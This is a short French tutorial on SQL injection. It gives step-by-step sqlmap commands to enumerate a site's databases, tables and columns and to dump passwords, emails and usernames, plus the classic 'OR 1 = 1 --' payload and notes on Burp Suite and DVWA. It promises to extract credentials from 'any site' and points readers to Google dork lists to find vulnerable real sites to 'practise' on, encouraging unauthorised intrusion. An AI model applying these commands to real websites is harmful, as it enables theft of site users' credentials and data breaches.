# faille SQL  

## prerequis :
- virtual box avec kali linux dedans
- sqlmap
- si besoin BVWA
- si besoin burp suite
  
## injection SQL :  

il peut etre placer dans un formulaire (car cela envoie une requete direct au serveur),dans des url,mais le moyen le plus efficace reste avec kali linux.
tout d abord il faut savoir que les base de donné sont en SQL et tout ce qui a un acces direct aux base de donné constitue une faille.
Je vais vous montré comment trouvé des identifiant dans n importe quelle site avec kali linux cela ne marche que si ces page n en sont pas proteger.
vous pouvez utilsier des outil comme sqlmap , cet outil va envoyer des centaine voire des millier de requet sql pour voire si le site a une faille . mais il reste quand meme un outil intermediare. pour pirater une dateabase par une application web plus securisé, vous pouvez utiliser l outil burp suite qui lui vous donnera toutes les infos et les chemin nessessaire mais vous aure besoin de taper a la main toutes les commandes.

## sqlmap :  

premiere commande , lister les database disponible dans le site :  

````bash
sudo sqlmap -u (l url de ton site) --dbs
````
- faire attention aux base de donné par defaut (ne pas les choisir)
  
deuxieme commande , obtenir les table disponible pour la base de donné choisis :

````bash
sudo sqlmap -u (l url de ton site) --(le nom de la base) --tables
````
troisieme commande , obtenir les columns disponible pour la table choisis :  

````bash
sudo sqlmap -u (l url de ton site) --(le nom de la base) -T (le nom de la table) --columns
````
quatrieme et derniere commande , recuperer les mots de passe ou les email ou les nom user ou les identifiant ou tout :  

````bash
sudo sqlmap -u (l url de ton site) --(le nom de la base) -T (le nom de la table) -C (case de la columns chosis),(encore),(encore),(etc) --dump
````
les sites avec beaucoup de dossier et fichier peuvent avoir une autre table (commande 3) vous la  retaper normalement c est le meme nom.

## burp suite et DVWA :

c est assez simple envoyer une premiere requete pour savoir si le site web vous repond ,ensuite recuperer la requet avec burp suite et edidter les chemin comme une nouvelle requet , les cookies et parametrer les envoies et meme voire les changement de la page web en direct.
mais on doit se dire comme apprendre le language sql ici vous trouvera une list de video yt qui utilisera notemant bvwa ou des site d entrainement pour apprendre :

https://www.youtube.com/watch?v=CoiA-6qhzvE (sqlmap , debutant - intro et exemple)

https://www.youtube.com/watch?v=fbt50vQfWZg (exemple utilisation sqlmap)

https://www.youtube.com/watch?v=ex4003kemTc&list=PLdZk2ypV8xBGn_KjnGWODTAm4iNBoNrtK&index=2 (dvwa, niveau low)

https://www.youtube.com/watch?v=dbfciJsFJIA (burp suite intro)

https://www.youtube.com/watch?v=fpx1fjBI-uI (burp suite tuto complet , A a Z)

https://www.youtube.com/watch?v=KWOs0Waq2TM&t=742s (burp suite niveau avancer , union et blind)

https://www.youtube.com/watch?v=1sYa65LsL94 (burp suite en brute force et avec des injection sql + exemple)


## commande connu :
````bash
'OR 1 = 1 --'
````
- reponse toujours vrai
  
## et pour vous entrainer sur des site non secu voici comment les trouver :

````bash
https://github.com/Proviesec/google-dorks/blob/main/google-dorks-for-sql-injection.txt
````
